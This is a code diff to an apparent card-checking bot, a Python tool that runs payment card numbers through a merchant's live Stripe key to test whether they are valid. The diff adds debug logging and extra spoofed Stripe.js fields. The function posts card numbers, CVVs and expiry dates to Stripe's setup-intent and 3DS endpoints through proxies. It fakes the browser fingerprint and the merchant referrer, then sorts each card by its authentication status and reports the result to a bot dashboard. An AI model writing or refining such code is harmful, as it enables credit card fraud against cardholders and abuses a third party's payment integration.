@@ -292,11 +292,15 @@ async def check_card(card, bot_app, auth_cookies):
     csrf_token, setup_secret = get_payment_page(session, proxies)
     
     if not setup_secret:
+        print(f"[!] Setup Secret failed for card: {card_number[:6]}****{card_number[-4:]}")
         stats['errors'] += 1
         stats['checking'] -= 1
+        stats['last_response'] = 'Setup Error'
         await update_dashboard(bot_app)
         session.close()
         return card, "ERROR", "فشل Setup"
+    
+    print(f"[✓] Setup Secret OK for: {card_number[:6]}****{card_number[-4:]}")
     
     headers = {
         'accept': 'application/json',
@@ -309,10 +313,11 @@ async def check_card(card, bot_app, auth_cookies):
     time_on_page = random.randint(300000, 600000)
     setup_intent_id = setup_secret.split('_secret_')[0]
     
-    confirm_data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][state]=AL&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[time_on_page]={time_on_page}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn&client_secret={setup_secret}'
+    # 🔥 نفس الـ data اللي في السكربت التجريبي
+    confirm_data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=AL&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0366a8cf46%3B+stripe-js-v3%2F0366a8cf46%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fmy.knownhost.com&payment_method_data[time_on_page]={time_on_page}&payment_method_data[client_attribution_metadata][client_session_id]={stripe_js_id}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn&client_attribution_metadata[client_session_id]={stripe_js_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={setup_secret}'
     
     try:
-        # 🔥 استخدام نفس البروكسي
+        print(f"[📡] Confirming setup intent...")
         response = session.post(
             f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm',
             headers=headers,
@@ -321,25 +326,38 @@ async def check_card(card, bot_app, auth_cookies):
             timeout=30
         )
         
+        print(f"[✓] Stripe Response Code: {response.status_code}")
         result = response.json()
         
         if 'error' in result:
+            error_msg = result['error'].get('message', 'Unknown')
+            error_code = result['error'].get('code', 'Unknown')
+            print(f"[❌] Stripe Error: {error_code} - {error_msg}")
             stats['errors'] += 1
             stats['checking'] -= 1
+            stats['last_response'] = f'Error: {error_code}'
             await update_dashboard(bot_app)
             session.close()
-            return card, "ERROR", result['error'].get('message', 'Unknown')
+            return card, "ERROR", error_msg
+        
+        # طباعة الـ keys الموجودة في Response
+        print(f"[📊] Response keys: {list(result.keys())}")
         
         if 'next_action' in result:
+            print(f"[✓] Has next_action - proceeding to 3DS...")
             source = result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
             
             auth_data = f'source={source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
             
-            # 🔥 استخدام نفس البروكسي
+            print(f"[📡] Sending 3DS authentication...")
             auth_response = session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=auth_data, proxies=proxies, timeout=30)
+            print(f"[✓] 3DS Response Code: {auth_response.status_code}")
+            
             auth_result = auth_response.json()
+            print(f"[📊] 3DS Response keys: {list(auth_result.keys())}")
             
             trans_status = auth_result.get('ares', {}).get('transStatus', 'Unknown')
+            print(f"[🎯] Transaction Status: {trans_status}")
             
             if trans_status == 'N':
                 stats['approved'] += 1
@@ -373,20 +391,28 @@ async def check_card(card, bot_app, auth_cookies):
                 session.close()
                 return card, "AUTH_ATTEMPTED", "Auth Attempted"
             else:
+                print(f"[⚠️] Unknown status: {trans_status}")
+                print(f"[📄] Full 3DS response: {auth_result}")
                 stats['errors'] += 1
                 stats['checking'] -= 1
-                stats['last_response'] = f'Status: {trans_status}'
+                stats['last_response'] = f'Unknown: {trans_status}'
                 await update_dashboard(bot_app)
                 session.close()
                 return card, "UNKNOWN", trans_status
         else:
+            print(f"[⚠️] No next_action in response")
+            print(f"[📄] Full response: {result}")
             stats['errors'] += 1
             stats['checking'] -= 1
+            stats['last_response'] = 'No 3DS Action'
             await update_dashboard(bot_app)
             session.close()
             return card, "ERROR", "No 3DS"
             
     except Exception as e:
+        print(f"[❌] Exception: {str(e)}")
+        import traceback
+        traceback.print_exc()
         stats['errors'] += 1
         stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
